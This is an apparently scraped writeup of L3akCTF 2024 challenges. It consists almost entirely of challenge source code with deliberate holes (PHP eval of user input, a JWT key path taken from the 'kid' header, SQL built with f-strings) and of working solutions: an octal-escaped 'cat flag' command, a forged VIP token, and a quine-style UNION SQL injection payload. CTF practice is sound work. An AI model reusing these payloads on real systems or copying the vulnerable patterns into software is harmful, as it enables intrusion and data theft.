# L3akCTF 2024 Writeup

> 原文: https://www.ctfiot.com/184419.html
> ID: 184419


```
// Set Flag
await page.setCookie({
 name: "flag",
 httpOnly: false,
 value: CONFIG.APPFLAG,
 domain: CONFIG.APPHOST
})
let cookies = await page.cookies()
console.log(cookies);
// Visit URL from user
console.log(`bot visiting ${urlToVisit}`)
await page.goto(urlToVisit, {
 waitUntil: 'networkidle2'
});
await sleep(8000);
cookies = await page.cookies()
console.log(cookies);

<?php

function popCalc() {
 if (isset($_GET['formula'])) {
 $formula = $_GET['formula'];
 if (strlen($formula) >= 150 || preg_match('/[a-z\'"]+/i', $formula)) {
 return 'Try Harder !';
 }
 try {
 eval('$calc = ' . $formula . ';');
 return isset($calc) ? $calc : '?';
 } catch (ParseError $err) {
 return 'Error';
 }
 }
}

$result = popCalc();
echo "Result: " . $result;

?>
total 16
dr-xr-xr-x 1 www-data www-data 4096 May 24 08:51 .
drwxr-xr-x 1 root root 4096 Nov 15 2022 ..
-r--r--r-- 1 root root 23 May 24 08:46 flag-eucmCjFHC1oimI0d9XxT7JzANCVOhrFX2OVdy8NxGQ3aPxDLd4WwwQ82eMKlRZBy.txt
-r-xr-xr-x 1 root root 467 May 24 08:46 index.php
`\143\141\164\40\146\154\141\147\55\52\56\164\170\164`
hamayanhamayan — 今日 18:44
!help

BatBot — 今日 18:44
Help Command:
 !help (Shows this message)
 !verify token (Authenticate with a JWT token)
 !generate (Generate a JWT Token for you)
@bot.command(name='verify')
async def authenticate(ctx, *, token=None):
 try:
 if isinstance(ctx.channel, discord.DMChannel) == False:
 await ctx.send("I can't see here 👀 , DM me")
 else:
 result = verify_jwt(token)
 print(ctx.author)
 print(result)
 if isinstance(result, dict):
 username = result.get('username')
 role = result.get('role')
 if username and role=='VIP':
 await ctx.send(f'Welcome Sir! Here is our secret {flag}')
 elif username:
 await ctx.send(f'Welcome {username}!')
 else:
 await ctx.send('Authentication failed. Please try again.')
 else:
 await ctx.send('Authentication failed.')
 
except:
 await ctx.send('Authentication failed.')
def verify_jwt(token):
 try:
 header = jwt.get_unverified_header(token)
 kid = header['kid']
 assert ("/" not in kid)
 with open(kid, 'r') as file:
 secret_key = file.read().strip()
 decoded_token = jwt.decode(token, secret_key, algorithms=['HS256'])
 return decoded_token
 
except Exception as e:
 return str(e)
import jwt
import os

with open('src/BatBot/bot.py', 'r') as file:
 secret_key = file.read().strip()
headers = {
 'kid': 'bot.py'
}
token = jwt.encode({'username': 'hamayanhamayan','role' : 'VIP'}, secret_key, algorithm='HS256',headers=headers)
print(token)
@app.route('/login', methods=['GET', 'POST'])
def login():
 if request.method == 'POST':
 try:
 username = request.form['username']
 password = request.form['password']
 conn = get_db_connection()
 cursor = conn.cursor()
 cursor.execute(f'SELECT username,email,password FROM users WHERE username ="{username}"')
 user = cursor.fetchone()
 conn.close()
 if user and user['username'] == username and user['password'] == hash_password(password):
 session['username'] = user['username']
 session['email'] = user['email']
 return redirect(url_for('dashboard'))
 else:
 return render_template('login.html', error='Invalid username or password')
 
except:
 return render_template('login.html', error='Invalid username or password')
 return render_template('login.html')
def add_flag(flag):
 conn = get_db_connection()
 cursor = conn.cursor()
 cursor.execute('INSERT INTO flags (flag) VALUES (?)', (flag,))
 conn.commit()
 conn.close()
" UNION SELECT REPLACE(REPLACE("' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS username, (SELECT flag FROM flags) AS email, 'a0a080f42e6f13b3a2df133f073095dd' AS password -- ' -- -",CHAR(39),CHAR(34)),CHAR(36),"' UNION SELECT REPLACE(REPLACE('$',CHAR(39),CHAR(34)),CHAR(36),'$') AS username, (SELECT flag FROM flags) AS email, 'a0a080f42e6f13b3a2df133f073095dd' AS password -- ' -- -") AS username, (SELECT flag FROM flags) AS email, "a0a080f42e6f13b3a2df133f073095dd" AS password -- " -- -
```
